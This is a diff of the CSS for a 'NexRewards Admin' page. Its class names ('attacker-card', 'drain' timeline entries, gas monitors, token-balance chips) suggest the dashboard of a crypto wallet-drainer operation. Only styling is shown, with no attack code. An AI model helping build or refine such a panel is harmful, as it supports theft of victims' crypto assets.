@@ -5,131 +5,164 @@
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>NexRewards Admin</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&family=Space+Grotesk:wght@500;600;700;800&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@500;600;700;800&display=swap');
     *{box-sizing:border-box;margin:0;padding:0}
     :root{
-      --bg:#06090f;--bg2:#0a0f1a;--surface:#0d1220;--surface2:#111827;--surface3:#151c2c;
-      --border:rgba(255,255,255,.06);--border2:rgba(255,255,255,.1);--border3:rgba(255,255,255,.14);
-      --gold:#f0a832;--gold2:#fbbf24;--goldbg:rgba(240,168,50,.08);--goldbr:rgba(240,168,50,.18);
-      --cyan:#00c8e8;--cyan2:#67e8f9;--cyanbg:rgba(0,200,232,.06);--cyanbr:rgba(0,200,232,.15);
-      --green:#00e676;--green2:#4ade80;--greenbg:rgba(0,230,118,.08);--greenbr:rgba(0,230,118,.2);
-      --red:#ff5252;--red2:#f87171;--redbg:rgba(255,82,82,.08);--redbr:rgba(255,82,82,.2);
-      --blue:#3b82f6;--yellow:#ffd740;--accent:#818cf8;--accent2:#6366f1;
-      --text:#f0f4f8;--muted:#7a8fa8;--muted2:#4a5f74;
+      --bg:#06080e;--bg2:#0a0f1a;--surface:#0c1018;--surface2:#101520;--surface3:#151c2c;
+      --border:rgba(255,255,255,.05);--border2:rgba(255,255,255,.08);--border3:rgba(255,255,255,.12);
+      --gold:#f0a832;--gold2:#fbbf24;--goldbg:rgba(240,168,50,.07);--goldbr:rgba(240,168,50,.15);
+      --cyan:#00c8e8;--cyan2:#67e8f9;--cyanbg:rgba(0,200,232,.06);--cyanbr:rgba(0,200,232,.12);
+      --green:#00e676;--green2:#4ade80;--greenbg:rgba(0,230,118,.06);--greenbr:rgba(0,230,118,.15);
+      --red:#ff5252;--red2:#f87171;--redbg:rgba(255,82,82,.06);--redbr:rgba(255,82,82,.15);
+      --blue:#3b82f6;--purple:#a78bfa;--yellow:#ffd740;
+      --text:#eef2f7;--text2:#c8d6e5;--muted:#6b7f99;--muted2:#3f5168;
       --grad:linear-gradient(135deg,#f0a832,#00c8e8);
-      --grad2:linear-gradient(135deg,#f0a832 0%,#e8a020 40%,#00c8e8 100%);
     }
+    html{scroll-behavior:smooth}
     body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;font-size:13px;overflow-x:hidden}
 
-    /* SCROLLBAR */
     ::-webkit-scrollbar{width:4px;height:4px}
     ::-webkit-scrollbar-track{background:transparent}
-    ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}
-    ::-webkit-scrollbar-thumb:hover{background:var(--border3)}
+    ::-webkit-scrollbar-thumb{background:var(--border3);border-radius:4px}
 
-    /* LOGIN */
-    #login-screen{display:flex;align-items:center;justify-content:center;min-height:100vh;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(240,168,50,.06),transparent),radial-gradient(ellipse 60% 50% at 80% 100%,rgba(0,200,232,.04),transparent)}
-    .login-box{background:var(--surface);border:1px solid var(--border2);border-radius:24px;padding:48px 44px;width:400px;text-align:center;box-shadow:0 32px 80px rgba(0,0,0,.6);position:relative;overflow:hidden}
-    .login-box::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--grad)}
-    .login-logo{width:56px;height:56px;background:var(--grad);border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:22px;margin:0 auto 22px;box-shadow:0 0 30px rgba(240,168,50,.25);font-family:'Space Grotesk',sans-serif;font-weight:800;color:#000}
-    .login-box h1{font-size:24px;font-weight:800;margin-bottom:6px;font-family:'Space Grotesk',sans-serif}
-    .login-box p{color:var(--muted);font-size:13px;margin-bottom:30px}
-    .login-box input{width:100%;background:var(--bg);border:1px solid var(--border2);color:var(--text);padding:13px 18px;border-radius:12px;font-size:14px;margin-bottom:16px;outline:none;transition:all .25s;font-family:inherit}
-    .login-box input:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(240,168,50,.1)}
-    #login-err{color:var(--red);font-size:12px;margin-top:8px;display:none}
+    /* ── LOGIN ── */
+    #login-screen{display:flex;align-items:center;justify-content:center;min-height:100vh;background:var(--bg);position:relative;overflow:hidden}
+    #login-screen::before{content:'';position:absolute;width:800px;height:800px;background:radial-gradient(circle,rgba(240,168,50,.06),transparent 70%);top:-200px;left:-200px}
+    #login-screen::after{content:'';position:absolute;width:600px;height:600px;background:radial-gradient(circle,rgba(0,200,232,.04),transparent 70%);bottom:-150px;right:-100px}
+    .login-box{background:var(--surface);border:1px solid var(--border2);border-radius:28px;padding:52px 48px;width:420px;text-align:center;box-shadow:0 40px 100px rgba(0,0,0,.5);position:relative;z-index:1}
+    .login-box::before{content:'';position:absolute;top:0;left:20%;right:20%;height:1px;background:var(--grad);filter:blur(1px)}
+    .login-logo{width:64px;height:64px;background:var(--grad);border-radius:18px;display:flex;align-items:center;justify-content:center;font-size:20px;margin:0 auto 24px;box-shadow:0 0 40px rgba(240,168,50,.2);font-family:'Space Grotesk',sans-serif;font-weight:800;color:#000;letter-spacing:-.5px}
+    .login-box h1{font-size:26px;font-weight:800;margin-bottom:6px;font-family:'Space Grotesk',sans-serif;letter-spacing:-.5px}
+    .login-box .subtitle{color:var(--muted);font-size:13px;margin-bottom:32px}
+    .login-field{position:relative;margin-bottom:14px}
+    .login-field input{width:100%;background:var(--bg2);border:1px solid var(--border2);color:var(--text);padding:14px 18px 14px 44px;border-radius:14px;font-size:14px;outline:none;transition:all .25s;font-family:inherit}
+    .login-field input:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(240,168,50,.08)}
+    .login-field .field-icon{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:var(--muted2);font-size:14px}
+    #login-err{color:var(--red);font-size:12px;margin-top:10px;display:none;font-weight:500}
 
-    /* BUTTONS */
-    .btn{display:inline-flex;align-items:center;gap:6px;background:var(--grad);color:#000;border:none;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;font-family:'Space Grotesk',sans-serif;letter-spacing:.2px}
-    .btn:hover{opacity:.9;transform:translateY(-1px);box-shadow:0 4px 16px rgba(240,168,50,.25)}
+    /* ── BUTTONS ── */
+    .btn{display:inline-flex;align-items:center;gap:6px;background:var(--grad);color:#000;border:none;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;font-family:'Space Grotesk',sans-serif}
+    .btn:hover{opacity:.9;transform:translateY(-1px);box-shadow:0 4px 20px rgba(240,168,50,.2)}
     .btn:active{transform:translateY(0)}
-    .btn.full{width:100%;justify-content:center;padding:13px}
+    .btn.full{width:100%;justify-content:center;padding:14px;font-size:14px;border-radius:14px}
     .btn.sm{padding:6px 14px;font-size:12px;border-radius:8px;font-family:'Inter',sans-serif}
     .btn.xs{padding:4px 10px;font-size:11px;border-radius:6px;font-family:'Inter',sans-serif}
-    .btn.red{background:var(--red);color:#fff}
-    .btn.red:hover{box-shadow:0 4px 16px rgba(255,82,82,.25)}
-    .btn.green{background:var(--green);color:#000}
-    .btn.green:hover{box-shadow:0 4px 16px rgba(0,230,118,.25)}
-    .btn.yellow{background:var(--yellow);color:#000}
+    .btn.red{background:var(--red);color:#fff}.btn.red:hover{box-shadow:0 4px 16px rgba(255,82,82,.2)}
+    .btn.green{background:var(--green);color:#000}.btn.green:hover{box-shadow:0 4px 16px rgba(0,230,118,.2)}
     .btn.ghost{background:transparent;border:1px solid var(--border2);color:var(--muted);font-family:'Inter',sans-serif}
     .btn.ghost:hover{border-color:var(--gold);color:var(--text);background:var(--goldbg)}
 
-    /* LAYOUT */
+    /* ── LAYOUT ── */
     #app{display:none;min-height:100vh}
-    .layout{display:grid;grid-template-columns:240px 1fr;min-height:100vh}
+    .layout{display:grid;grid-template-columns:250px 1fr;min-height:100vh}
 
-    /* SIDEBAR */
-    .sidebar{background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column;position:sticky;top:0;height:100vh;overflow-y:auto}
-    .sidebar-logo{padding:22px 20px 18px;border-bottom:1px solid var(--border)}
-    .sidebar-logo .logo-icon{width:36px;height:36px;background:var(--grad);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;box-shadow:0 0 16px rgba(240,168,50,.2);font-family:'Space Grotesk',sans-serif;font-weight:800;color:#000}
-    .sidebar-logo .logo-text{font-size:15px;font-weight:800;line-height:1.2;font-family:'Space Grotesk',sans-serif}
-    .sidebar-logo .logo-sub{font-size:10px;color:var(--gold);font-weight:700;letter-spacing:1px}
-    .sidebar-nav{padding:14px 12px;flex:1}
-    .nav-section{font-size:9px;font-weight:700;color:var(--muted2);text-transform:uppercase;letter-spacing:1.2px;padding:12px 10px 6px;margin-top:6px}
-    .nav-item{display:flex;align-items:center;gap:11px;padding:9px 12px;border-radius:10px;cursor:pointer;color:var(--muted);font-size:13px;font-weight:500;transition:all .2s;margin-bottom:2px;position:relative}
-    .nav-item:hover{background:rgba(255,255,255,.04);color:var(--text)}
-    .nav-item.active{background:var(--goldbg);color:var(--gold);border:1px solid var(--goldbr)}
-    .nav-item.active::before{content:'';position:absolute;left:0;top:50%;transform:translateY(-50%);width:3px;height:18px;background:var(--gold);border-radius:0 3px 3px 0}
-    .nav-item .icon{font-size:15px;width:22px;text-align:center;flex-shrink:0}
-    .nav-badge{margin-left:auto;background:var(--gold);color:#000;font-size:10px;padding:2px 7px;border-radius:10px;font-weight:700;min-width:20px;text-align:center}
-    .nav-badge.green{background:var(--green)}
-    .sidebar-footer{padding:16px;border-top:1px solid var(--border)}
-    .attacker-card{background:var(--bg);border:1px solid var(--border2);border-radius:10px;padding:12px 14px}
-    .attacker-card .label{font-size:9px;color:var(--muted2);text-transform:uppercase;letter-spacing:.8px;margin-bottom:5px;font-weight:700}
-    .attacker-card .addr{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--cyan);word-break:break-all}
-    .gas-row{display:flex;justify-content:space-between;align-items:center;margin-top:6px;font-size:11px}
-    .gas-chip{background:var(--greenbg);border:1px solid var(--greenbr);color:var(--green);padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600}
-    .gas-chip.low{background:rgba(255,215,64,.08);border-color:rgba(255,215,64,.2);color:var(--yellow)}
-    .gas-chip.zero{background:rgba(100,116,139,.08);border-color:rgba(100,116,139,.15);color:var(--muted)}
+    /* ── SIDEBAR ── */
+    .sidebar{background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column;position:sticky;top:0;height:100vh;overflow-y:auto;overflow-x:hidden}
+    .sb-header{padding:22px 20px;border-bottom:1px solid var(--border)}
+    .sb-brand{display:flex;align-items:center;gap:12px}
+    .sb-logo{width:38px;height:38px;background:var(--grad);border-radius:11px;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0;box-shadow:0 0 20px rgba(240,168,50,.15);font-family:'Space Grotesk',sans-serif;font-weight:800;color:#000}
+    .sb-name{font-size:16px;font-weight:800;font-family:'Space Grotesk',sans-serif;letter-spacing:-.3px}
+    .sb-tag{font-size:9px;color:var(--gold);font-weight:700;letter-spacing:1.5px;margin-top:1px}
+    .sb-status{display:flex;align-items:center;gap:6px;margin-top:14px;font-size:11px;color:var(--muted)}
+    .sb-status .pulse{width:6px;height:6px;background:var(--green);border-radius:50%;box-shadow:0 0 8px var(--green);animation:pulse 2s infinite}
 
-    /* MAIN */
-    .main{padding:28px 30px;overflow-y:auto;background:radial-gradient(ellipse 60% 30% at 80% 0%,rgba(0,200,232,.02),transparent)}
+    .sb-nav{flex:1;padding:14px 12px}
+    .sb-section{font-size:9px;font-weight:800;color:var(--muted2);text-transform:uppercase;letter-spacing:1.5px;padding:14px 12px 6px}
+    .sb-item{display:flex;align-items:center;gap:11px;padding:10px 14px;border-radius:12px;cursor:pointer;color:var(--muted);font-size:13px;font-weight:500;transition:all .15s;margin-bottom:2px;position:relative}
+    .sb-item:hover{background:rgba(255,255,255,.03);color:var(--text)}
+    .sb-item.active{background:var(--goldbg);color:var(--gold)}
+    .sb-item.active::before{content:'';position:absolute;left:0;top:50%;transform:translateY(-50%);width:3px;height:20px;background:var(--gold);border-radius:0 4px 4px 0}
+    .sb-icon{font-size:16px;width:22px;text-align:center;flex-shrink:0;opacity:.8}
+    .sb-badge{margin-left:auto;background:var(--gold);color:#000;font-size:10px;padding:2px 8px;border-radius:10px;font-weight:700;min-width:22px;text-align:center}
+    .sb-badge.g{background:var(--green)}
+
+    .sb-footer{padding:14px;border-top:1px solid var(--border)}
+    .sb-wallet{background:var(--bg2);border:1px solid var(--border2);border-radius:12px;padding:14px}
+    .sb-wallet-label{font-size:9px;color:var(--muted2);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;font-weight:700}
+    .sb-wallet-addr{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--cyan);word-break:break-all;line-height:1.5}
+    .sb-wallet-chips{display:flex;flex-wrap:wrap;gap:3px;margin-top:8px}
+    .sb-actions{display:flex;gap:6px;margin-top:12px}
+    .sb-actions .btn{flex:1;justify-content:center}
+    .sb-meta{font-size:10px;color:var(--muted2);text-align:center;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:6px}
+
+    /* ── MAIN ── */
+    .main{padding:28px 32px;overflow-y:auto;position:relative}
+    .main::before{content:'';position:fixed;top:0;right:0;width:500px;height:500px;background:radial-gradient(circle,rgba(0,200,232,.015),transparent 70%);pointer-events:none}
     .page{display:none}
-    .page.active{display:block;animation:fadeIn .3s ease}
-    @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
-    .page-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
-    .page-header h1{font-size:20px;font-weight:800;font-family:'Space Grotesk',sans-serif;letter-spacing:-.3px}
-    .page-header p{font-size:12px;color:var(--muted);margin-top:3px}
+    .page.active{display:block;animation:pageIn .35s ease}
+    @keyframes pageIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+    .page-head{margin-bottom:26px}
+    .page-head h1{font-size:22px;font-weight:800;font-family:'Space Grotesk',sans-serif;letter-spacing:-.5px;margin-bottom:4px}
+    .page-head p{font-size:12px;color:var(--muted)}
+    .page-head-row{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:12px}
 
-    /* STATS GRID */
-    .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px;margin-bottom:24px}
-    .stat{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:18px 20px;position:relative;overflow:hidden;transition:all .2s}
-    .stat:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.2)}
-    .stat::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
-    .stat.s-blue::before{background:var(--blue)}
-    .stat.s-green::before{background:var(--green)}
-    .stat.s-red::before{background:var(--red)}
-    .stat.s-yellow::before{background:var(--yellow)}
-    .stat.s-purple::before{background:var(--grad)}
-    .stat .sv{font-size:30px;font-weight:800;line-height:1;margin-bottom:5px;font-family:'Space Grotesk',sans-serif}
-    .stat .sl{font-size:11px;color:var(--muted);font-weight:500}
-    .stat .sc{font-size:11px;margin-top:8px;font-weight:500}
-    .stat.s-green .sv{color:var(--green)}
-    .stat.s-red .sv{color:var(--red)}
-    .stat.s-yellow .sv{color:var(--yellow)}
-    .stat.s-blue .sv{color:var(--blue)}
+    /* ── STAT CARDS ── */
+    .stats-row{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;margin-bottom:26px}
+    .scard{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:20px;position:relative;overflow:hidden;transition:all .2s}
+    .scard:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 12px 32px rgba(0,0,0,.15)}
+    .scard-glow{position:absolute;top:-20px;right:-20px;width:80px;height:80px;border-radius:50%;opacity:.08;filter:blur(20px)}
+    .scard-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;margin-bottom:14px}
+    .scard-val{font-size:28px;font-weight:800;font-family:'Space Grotesk',sans-serif;letter-spacing:-.5px;line-height:1;margin-bottom:4px}
+    .scard-label{font-size:11px;color:var(--muted);font-weight:500}
+    .scard-sub{font-size:11px;margin-top:8px;font-weight:600;display:flex;align-items:center;gap:4px}
+    .scard.blue .scard-glow{background:var(--blue)}.scard.blue .scard-icon{background:rgba(59,130,246,.1);color:var(--blue)}.scard.blue .scard-val{color:var(--blue)}
+    .scard.green .scard-glow{background:var(--green)}.scard.green .scard-icon{background:var(--greenbg);color:var(--green)}.scard.green .scard-val{color:var(--green)}
+    .scard.red .scard-glow{background:var(--red)}.scard.red .scard-icon{background:var(--redbg);color:var(--red)}.scard.red .scard-val{color:var(--red)}
+    .scard.gold .scard-glow{background:var(--gold)}.scard.gold .scard-icon{background:var(--goldbg);color:var(--gold)}.scard.gold .scard-val{color:var(--gold)}
+    .scard.purple .scard-glow{background:var(--purple)}.scard.purple .scard-icon{background:rgba(167,139,250,.1);color:var(--purple)}.scard.purple .scard-val{color:var(--purple)}
 
-    /* CARDS */
-    .card{background:var(--surface);border:1px solid var(--border);border-radius:14px;margin-bottom:18px;overflow:hidden;transition:border-color .2s}
-    .card:hover{border-color:var(--border2)}
-    .card-head{display:flex;align-items:center;justify-content:space-between;padding:15px 20px;border-bottom:1px solid var(--border);flex-wrap:wrap;gap:8px}
-    .card-head h2{font-size:14px;font-weight:700;font-family:'Space Grotesk',sans-serif;display:flex;align-items:center;gap:8px}
-    .card-body{padding:20px}
-    .card-body.p0{padding:0}
+    /* ── CARDS ── */
+    .card{background:var(--surface);border:1px solid var(--border);border-radius:16px;margin-bottom:18px;overflow:hidden}
+    .card-head{display:flex;align-items:center;justify-content:space-between;padding:16px 22px;border-bottom:1px solid var(--border);flex-wrap:wrap;gap:8px}
+    .card-title{font-size:14px;font-weight:700;font-family:'Space Grotesk',sans-serif;display:flex;align-items:center;gap:8px}
+    .card-body{padding:22px}
+    .card-body.flush{padding:0}
 
-    /* TABLE */
+    /* ── DONUT ── */
+    .donut-wrap{display:flex;align-items:center;gap:24px;padding:10px 0}
+    .donut{width:90px;height:90px;border-radius:50%;position:relative;flex-shrink:0}
+    .donut-center{position:absolute;inset:14px;background:var(--surface);border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center}
+    .donut-pct{font-size:18px;font-weight:800;font-family:'Space Grotesk',sans-serif}
+    .donut-sub{font-size:8px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:.5px}
+    .donut-legend{display:flex;flex-direction:column;gap:8px}
+    .donut-leg-item{display:flex;align-items:center;gap:8px;font-size:12px}
+    .donut-leg-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+
+    /* ── CHAIN BARS ── */
+    .chain-bar-wrap{margin-bottom:14px}
+    .chain-bar-label{display:flex;justify-content:space-between;margin-bottom:5px;font-size:11px}
+    .chain-bar-name{font-weight:600;display:flex;align-items:center;gap:6px}
+    .chain-bar-val{color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:11px}
+    .chain-bar-track{height:6px;background:rgba(255,255,255,.04);border-radius:4px;overflow:hidden}
+    .chain-bar-fill{height:100%;border-radius:4px;transition:width .8s ease}
+
+    /* ── ACTIVITY TIMELINE ── */
+    .timeline{display:flex;flex-direction:column;gap:2px;max-height:300px;overflow-y:auto}
+    .tl-item{display:flex;gap:12px;padding:10px 14px;border-radius:10px;transition:background .1s}
+    .tl-item:hover{background:rgba(255,255,255,.02)}
+    .tl-dot{width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0}
+    .tl-dot.connect{background:rgba(59,130,246,.1);color:var(--blue)}
+    .tl-dot.drain{background:var(--greenbg);color:var(--green)}
+    .tl-dot.fail{background:var(--redbg);color:var(--red)}
+    .tl-dot.info{background:var(--goldbg);color:var(--gold)}
+    .tl-body{flex:1;min-width:0}
+    .tl-msg{font-size:12px;color:var(--text2);line-height:1.5}
+    .tl-msg strong{color:#fff;font-weight:600}
+    .tl-time{font-size:10px;color:var(--muted2);margin-top:2px}
+
+    /* ── TABLE ── */
     .table-wrap{overflow-x:auto}
     table{width:100%;border-collapse:collapse;font-size:12px}
-    th{text-align:left;color:var(--muted);font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.8px;padding:10px 16px;border-bottom:1px solid var(--border);background:var(--surface2);white-space:nowrap}
-    td{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,.025);vertical-align:middle}
+    th{text-align:left;color:var(--muted);font-weight:700;font-size:10px;text-transform:uppercase;letter-spacing:1px;padding:11px 16px;border-bottom:1px solid var(--border);background:var(--surface2);white-space:nowrap}
+    td{padding:13px 16px;border-bottom:1px solid rgba(255,255,255,.02);vertical-align:middle}
     tr:last-child td{border-bottom:none}
-    tr:hover td{background:rgba(255,255,255,.015)}
+    tr:hover td{background:rgba(255,255,255,.012)}
     .mono{font-family:'JetBrains Mono',monospace}
-    .addr-full{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--cyan)}
     .addr-short{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--cyan);cursor:pointer;transition:color .15s}
     .addr-short:hover{color:var(--gold)}
 
-    /* BADGES */
-    .badge{display:inline-flex;align-items:center;gap:5px;font-size:10px;padding:3px 10px;border-radius:20px;font-weight:700;font-family:'Inter',sans-serif;white-space:nowrap;letter-spacing:.3px}
+    /* ── BADGES ── */
+    .badge{display:inline-flex;align-items:center;gap:5px;font-size:10px;padding:3px 10px;border-radius:20px;font-weight:700;white-space:nowrap;letter-spacing:.3px}
     .badge.success{background:var(--greenbg);color:var(--green);border:1px solid var(--greenbr)}
     .badge.fail{background:var(--redbg);color:var(--red);border:1px solid var(--redbr)}
     .badge.pending{background:var(--goldbg);color:var(--gold);border:1px solid var(--goldbr)}
@@ -137,90 +170,102 @@
     .badge.online{background:var(--greenbg);color:var(--green);border:1px solid var(--greenbr)}
     .badge::before{content:'';width:5px;height:5px;border-radius:50%;background:currentColor}
 
-    /* TOKEN CHIPS */
+    /* ── TOKEN CHIPS ── */
     .token-chips{display:flex;flex-wrap:wrap;gap:4px}
-    .token-chip{background:var(--cyanbg);border:1px solid var(--cyanbr);border-radius:6px;padding:3px 8px;font-size:11px;font-family:'JetBrains Mono',monospace;white-space:nowrap;transition:all .15s}
-    .token-chip:hover{background:rgba(0,200,232,.12)}
+    .token-chip{background:var(--cyanbg);border:1px solid var(--cyanbr);border-radius:6px;padding:3px 8px;font-size:11px;font-family:'JetBrains Mono',monospace;white-space:nowrap}
     .token-chip .sym{color:var(--cyan);font-weight:600}
     .token-chip .bal{color:var(--text);margin-left:3px}
     .token-chip .chain{color:var(--muted);margin-left:3px;font-size:10px}
 
-    /* FORM */
+    /* ── FORM ── */
     .form-group{margin-bottom:18px}
-    .form-group label{display:block;font-size:11px;color:var(--muted);margin-bottom:7px;font-weight:700;text-transform:uppercase;letter-spacing:.6px}
-    .form-group input,.form-group select{width:100%;background:var(--bg);border:1px solid var(--border2);color:var(--text);padding:11px 16px;border-radius:10px;font-size:13px;font-family:inherit;outline:none;transition:all .25s}
-    .form-group input:focus,.form-group select:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(240,168,50,.08)}
+    .form-group label{display:block;font-size:10px;color:var(--muted);margin-bottom:7px;font-weight:800;text-transform:uppercase;letter-spacing:1px}
+    .form-group input,.form-group select{width:100%;background:var(--bg2);border:1px solid var(--border2);color:var(--text);padding:12px 16px;border-radius:12px;font-size:13px;font-family:inherit;outline:none;transition:all .25s}
+    .form-group input:focus,.form-group select:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(240,168,50,.06)}
     .form-group .hint{font-size:11px;color:var(--muted);margin-top:6px}
     .form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px}
 
-    /* LOG BOX */
-    .log-box{background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:11px;height:340px;overflow-y:auto;line-height:1.9}
-    .log-entry{display:flex;gap:10px;align-items:baseline;padding:1px 0}
-    .log-entry:hover{background:rgba(255,255,255,.02);border-radius:4px}
+    /* ── LOG BOX ── */
+    .log-box{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:11px;height:340px;overflow-y:auto;line-height:1.9}
+    .log-entry{display:flex;gap:10px;align-items:baseline;padding:2px 4px;border-radius:4px}
+    .log-entry:hover{background:rgba(255,255,255,.02)}
     .log-ts{color:var(--muted2);flex-shrink:0;font-size:10px}
-    .log-level-info{color:var(--cyan)}
-    .log-level-warn{color:var(--yellow)}
-    .log-level-error{color:var(--red)}
-    .log-msg{color:#94a3b8;word-break:break-all}
+    .log-level-info{color:var(--cyan);font-weight:600}
+    .log-level-warn{color:var(--yellow);font-weight:600}
+    .log-level-error{color:var(--red);font-weight:600}
+    .log-msg{color:var(--text2);word-break:break-all}
 
-    /* GAS MONITOR */
-    .gas-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px}
-    .gas-card{background:var(--bg);border:1px solid var(--border2);border-radius:12px;padding:16px;transition:all .2s}
-    .gas-card:hover{border-color:var(--border3);transform:translateY(-1px)}
-    .gas-card .chain-name{font-size:12px;font-weight:700;margin-bottom:8px;font-family:'Space Grotesk',sans-serif}
-    .gas-card .balance{font-family:'JetBrains Mono',monospace;font-size:16px;font-weight:600;margin-bottom:4px}
-    .gas-card .balance.funded{color:var(--green)}
-    .gas-card .balance.low{color:var(--yellow)}
-    .gas-card .balance.empty{color:var(--muted)}
+    /* ── GAS MONITOR ── */
+    .gas-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:12px}
+    .gas-card{background:var(--bg2);border:1px solid var(--border2);border-radius:14px;padding:18px;transition:all .2s}
+    .gas-card:hover{border-color:var(--border3);transform:translateY(-2px)}
+    .gas-card .chain-name{font-size:13px;font-weight:700;margin-bottom:10px;font-family:'Space Grotesk',sans-serif}
+    .gas-card .balance{font-family:'JetBrains Mono',monospace;font-size:17px;font-weight:600;margin-bottom:4px}
+    .gas-card .balance.funded{color:var(--green)}.gas-card .balance.low{color:var(--yellow)}.gas-card .balance.empty{color:var(--muted)}
     .gas-card .status-bar{height:3px;border-radius:3px;background:var(--border);margin-top:10px;overflow:hidden}
     .gas-card .status-bar-fill{height:100%;border-radius:3px;transition:width .6s ease}
 
-    /* WALLET DETAIL MODAL */
-    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.8);backdrop-filter:blur(8px);z-index:100;display:none;align-items:center;justify-content:center}
+    /* ── MODAL ── */
+    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(12px);z-index:100;display:none;align-items:center;justify-content:center}
     .modal-overlay.open{display:flex}
-    .modal{background:var(--surface);border:1px solid var(--border2);border-radius:20px;padding:30px;width:580px;max-width:95vw;max-height:85vh;overflow-y:auto;box-shadow:0 32px 80px rgba(0,0,0,.5);position:relative}
-    .modal::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--grad);border-radius:20px 20px 0 0}
-    .modal h2{font-size:17px;font-weight:800;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;font-family:'Space Grotesk',sans-serif}
-    .modal-close{cursor:pointer;color:var(--muted);font-size:20px;line-height:1;transition:color .15s;width:32px;height:32px;display:flex;align-items:center;justify-content:center;border-radius:8px}
-    .modal-close:hover{color:var(--text);background:rgba(255,255,255,.06)}
-    .detail-row{display:flex;justify-content:space-between;align-items:flex-start;padding:10px 0;border-bottom:1px solid var(--border);gap:14px}
+    .modal{background:var(--surface);border:1px solid var(--border2);border-radius:22px;padding:32px;width:600px;max-width:95vw;max-height:85vh;overflow-y:auto;box-shadow:0 40px 100px rgba(0,0,0,.5);position:relative}
+    .modal::before{content:'';position:absolute;top:0;left:15%;right:15%;height:1px;background:var(--grad)}
+    .modal h2{font-size:18px;font-weight:800;margin-bottom:22px;display:flex;align-items:center;justify-content:space-between;font-family:'Space Grotesk',sans-serif}
+    .modal-close{cursor:pointer;color:var(--muted);font-size:18px;width:34px;height:34px;display:flex;align-items:center;justify-content:center;border-radius:10px;transition:all .15s}
+    .modal-close:hover{color:var(--text);background:rgba(255,255,255,.05)}
+    .detail-row{display:flex;justify-content:space-between;align-items:flex-start;padding:11px 0;border-bottom:1px solid var(--border);gap:14px}
     .detail-row:last-child{border-bottom:none}
-    .detail-label{font-size:11px;color:var(--muted);font-weight:700;text-transform:uppercase;letter-spacing:.6px;flex-shrink:0;padding-top:2px}
+    .detail-label{font-size:10px;color:var(--muted);font-weight:800;text-transform:uppercase;letter-spacing:.8px;flex-shrink:0;padding-top:2px}
     .detail-value{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text);text-align:right;word-break:break-all}
 
-    /* LIVE PULSE */
     @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
-    .live-dot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:pulse 2s infinite;display:inline-block;margin-right:6px;box-shadow:0 0 6px var(--green)}
     @keyframes spin{to{transform:rotate(360deg)}}
     .spin{animation:spin .7s linear infinite;display:inline-block}
 
-    /* EMPTY */
-    .empty-state{text-align:center;padding:44px 20px;color:var(--muted)}
-    .empty-state .icon{font-size:36px;margin-bottom:12px;opacity:.6}
+    .empty-state{text-align:center;padding:48px 20px;color:var(--muted)}
